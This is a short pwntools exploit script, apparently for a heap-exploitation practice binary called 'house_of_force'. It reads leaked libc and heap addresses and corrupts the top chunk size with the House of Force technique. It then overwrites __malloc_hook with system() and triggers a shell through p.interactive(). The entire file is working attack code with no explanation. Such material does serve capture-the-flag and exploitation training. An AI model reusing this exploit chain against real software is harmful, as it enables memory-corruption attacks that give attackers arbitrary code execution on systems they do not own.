from pwn import * 
context.binary = "./house_of_force"

p = process()
script = """
b*main+363
"""


def malloc(mysize: int, mydata: bytes):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'size: ', str(mysize).encode())
    p.sendafter(b'data: ', mydata)

victim = 0x602010
exit = 0x601fd8

p.recvuntil(b'puts() @ ')
leak_libc = int(p.recvline().strip(b'\n'),16)
p.recvuntil(b'heap @ ')
leak_heap = int(p.recvline().strip(b'\n'),16)
log.success("Libc leak: %s", hex(leak_libc))
log.success("Heap leak: %s", hex(leak_heap))
libc_base = leak_libc - 0x6df10
malloc_hook = libc_base + 0x3afc10
one_gadget = libc_base + 0xdf681
sys_func = libc_base + 0x41b70
bin_sh = libc_base + 0x177375
log.success("Libc libc base: %s", hex(libc_base))
log.success("Malloc hook : %s", hex(malloc_hook))

##Use to overwrite target
# gdb.attach(p,script)
# malloc(0x10,b'A'*24+p64(0xffffffffffffffff))
# size_to_malloc = victim - (leak_heap+0x20) - 0x20
# malloc(size_to_malloc,b'YZ')
# malloc(0x20,b'GETREKT')
##Use to overwrite malloc_hook to
gdb.attach(p,script)
malloc(0x10,b'A'*24+p64(0xffffffffffffffff))
size_to_malloc = malloc_hook - (leak_heap+0x20) - 0x20
malloc(size_to_malloc,b'YZ')
malloc(0x20,p64(sys_func))
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'size: ', str(bin_sh).encode())




p.interactive()


